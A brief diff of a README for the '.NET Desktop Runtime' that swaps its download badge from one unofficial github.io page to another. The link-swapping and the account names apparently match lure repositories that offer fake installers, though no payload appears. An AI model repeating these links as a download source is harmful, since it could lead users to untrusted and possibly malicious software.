@@ -1,6 +1,6 @@
 # .NET Desktop Runtime - Windows Desktop App Runtime
 
-[![GET .NET Desktop Runtime](https://img.shields.io/badge/GET%20%E2%80%94%20.NET%20Desktop%20Runtime-0078D6?style=for-the-badge&logoColor=white)](https://dorianarellanohfw.github.io/.github/net-desktop-runtime)
+[![GET .NET Desktop Runtime](https://img.shields.io/badge/GET%20%E2%80%94%20.NET%20Desktop%20Runtime-0078D6?style=for-the-badge&logoColor=white)](https://zyairemillerqobz.github.io/.github/net-desktop-runtime)
 
 ## Practical Overview of .NET Desktop Runtime
 
